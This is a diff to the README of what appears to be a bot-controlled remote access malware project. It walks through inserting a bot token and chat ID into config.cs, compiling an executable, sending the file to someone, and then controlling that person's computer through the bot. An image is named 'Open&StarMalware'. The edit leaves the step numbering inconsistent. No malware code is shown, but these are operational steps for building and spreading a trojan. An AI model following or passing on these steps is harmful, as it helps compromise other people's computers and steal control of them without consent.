@@ -130,16 +130,15 @@ The use of this program must comply with applicable laws and be used only for le
 7. Open the `config.cs` file in the project.  
    ![](images/OpenConfig.jpg)
 
-8. Insert your token from the bot and your chat ID that you received earlier.
-
-9. Above, you need to select ”Release”.  
+8. Insert your token from the bot and your chat ID that you received earlier & Above, you need to select ”Release”.
    ![](images/SaveConfig.jpg)
 
-10. Press `CTRL + S` to save and `CTRL + B` to compile everything into an executable file.  
+9. Press `CTRL + S` to save and `CTRL + B` to compile everything into an executable file.  
     ![](images/Build.jpg)
 
-11. You can send the received file to someone.
-
+10. You can send the received file to someone.
+    ![](images/Open&StarMalware.jpg)
+    
 12. After starting the file, you can control the computer through the bot.  
     ![](images/Open&StarMalware.jpg)
 
